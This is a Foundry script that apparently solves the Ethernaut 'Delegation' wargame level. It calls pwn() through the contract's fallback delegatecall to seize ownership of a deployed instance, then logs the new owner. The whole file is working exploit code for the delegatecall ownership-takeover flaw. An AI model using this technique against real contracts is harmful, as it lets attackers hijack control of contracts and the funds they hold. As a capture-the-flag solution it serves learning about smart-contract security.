// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Level5TokenSolution is Script {
    Delegation public instance = Delegation(0xB16d2386D818d6cF327288C7Fb5fBd9411cfD608);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // address(instance).call{value: 0}(bytes4(keccak256("pwn()")));
        address(instance).call{value: 0}(abi.encodeWithSignature("pwn()"));

        console.log("owner: ", instance.owner());
        vm.stopBroadcast();
    }
}
